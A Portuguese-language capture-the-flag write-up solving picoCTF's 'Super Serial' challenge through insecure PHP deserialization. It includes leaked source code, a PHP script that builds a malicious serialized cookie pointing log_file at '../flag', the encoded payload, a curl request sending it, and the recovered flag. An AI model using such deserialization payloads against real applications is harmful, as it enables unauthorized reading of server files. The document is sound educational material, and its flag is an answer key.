

# Super Serial
###### Solved by @Mayaracar2
> This is a CTF about Path Traversal,Web Exploitation
## Desafio: Super Serial (Exploração Web) 
### Introdução
O desafio apresenta o seguinte enunciado: 

"Try to recover the flag stored on this website http://mercury.picoctf.net:5428/"


#### Tradução
"Tente recuperar a bandeira armazenada neste site http://mercury.picoctf.net:5428/"


- [Página do desafio](https://play.picoctf.org/practice/challenge/180)
### Análise inicial
A princípio, o desafio forneceu um link que nos direciona para o seguinte site:

- [Link do site](http://mercury.picoctf.net:5428/)

Ao acessar a página inicial não havia indicação direta da flag. Assim, foi feita uma análise básica de diretórios e arquivos públicos do site para encontrar possíveis pistas.

## Solução
Primeiramente foi verificado o arquivo `robots.txt`:

```bash
http://mercury.picoctf.net:5428/robots.txt
```

O conteúdo retornado foi:

```bash
User-agent: *
Disallow: /admin.phps
```

A presença de caminhos terminados em `.phps` sugeriu que versões com extensão .phps (que normalmente mostram o código-fonte PHP) estavam acessíveis. 

E ao tentar acesso na página, qualquer login retornaria acesso inválido e um diretório `.php`.

A partir disso, tentou-se acessar `index.phps`:

```bash
http://mercury.picoctf.net:5428/index.phps
```
O index.phps revelou o seguinte comportamento (trecho relevante):

```bash
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```

Observou-se que o `index` serializava um objeto permissions, codificava em base64, fazia `urlencode` e armazenava no cookie login. Além disso havia referências a `cookie.php` e `authentication.php`, que foram analisadas em sequência.

Ao abrir `cookie.phps`, encontrou-se a definição da classe permissions e o trecho que desserializa o cookie:

```bash
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		...
	}

    function is_admin() {
        ...
    }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>

```

Em `authentication.phps` havia a classe `access_log` cuja propriedade `log_file` é usada para ler/escrever logs, e o arquivo é lido `via __toString()`:

```bash
 class access_log
{
	public $log_file;

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}
````
Fluxo crítico:

- O servidor desserializa um objeto enviado pelo cookie.

- Se o objeto indicar admin, `authentication.php` instancia `access_log` e, ao converter o objeto para string, lê o arquivo apontado por `log_file`.

Como o servidor aceita objetos serializados vindos do cliente sem validar a classe/atributos, basta enviar um objeto que, quando desserializado, possua `log_file = "../flag"`. Dessa forma, ao usar `access_log`, o código lê e retorna o conteúdo de `../flag`.

Portanto, foi criado um código php para gerar o valor desse cookie:

```bash
<?php
class access_log {
    public $log_file;
}
 
$obj = new access_log();
$obj->log_file = "../flag";
 
// Gerar cookie pronto
$cookie = urlencode(base64_encode(serialize($obj)));
echo $cookie;
?>
<?php
```
<img width="1354" height="687" alt="image" src="https://github.com/user-attachments/assets/13109cfb-4dde-4fa9-bbe2-c73df4498d83" />

Ao rodar em um compilador online, foi gerado o seguinte valor:

```bash
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```
Logo, inspecione a página e alterar o valor do cookie: 

<img width="1357" height="605" alt="image" src="https://github.com/user-attachments/assets/dc31935d-211d-49be-a153-9c8712fa2ac5" />

Após substituir o valor do cookie login no navegador e recarregar a página, a aplicação passou a identificar o cliente como `guest` (ou seja, a interface não mostrou diretamente a flag). Contudo, o payload inserido no cookie já aponta para `../flag no servidor`, a flag não aparece no HTML renderizado pelo navegador, mas pode ser obtida fazendo uma requisição direta ao endpoint que processa o cookie.

Para isso, no terminal, enviou-se uma requisição HTTP incluindo o cookie malicioso, através do curl:
```
curl -s -b "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9" http://mercury.picoctf.net:5428/authentication.php
```

Se tem como resposta:

<img width="661" height="205" alt="image" src="https://github.com/user-attachments/assets/022bf13d-ce58-4f0e-8e2e-97fec421563f" />


>`picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_c5123066}  `

## Conclusão
O desafio mostrou que o servidor fazia desserialização insegura. Como ele confiava em objetos enviados pelo usuário, foi possível ler arquivos sensíveis (../flag). Para evitar isso, é importante não desserializar dados do cliente, validar todas as entradas e proteger arquivos importantes.
